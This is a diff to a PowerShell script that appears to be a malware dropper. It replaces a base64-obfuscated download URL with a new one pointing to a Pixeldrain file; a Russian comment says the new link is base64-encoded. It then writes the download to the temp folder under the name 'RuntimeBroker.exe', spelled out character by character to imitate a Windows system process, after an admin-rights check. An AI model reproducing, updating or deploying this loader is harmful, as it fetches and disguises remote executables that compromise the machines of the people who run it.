@@ -30,7 +30,8 @@ if ($isAdmin) {
 }
 # ────────────────────────────────────────────────────────────────────────
 
-$u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9hd2Vkc2FrbHNhcS5vbnJlbmRlci5jb20vZi9tbE5FS3lWLQ=='))
+# Новая ссылка на Pixeldrain (закодирована в base64)
+$u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9waXhlbGRyYWluLmNvbS9hcGkvZmlsZS9lTFFnRk1VNz9kb3dubG9hZA=='))
 $t=[IO.Path]::GetTempPath()
 $n=('R','u','n','t','i','m','e','B','r','o','k','e','r','.','e','x','e') -join ''
 $p=$t+$n
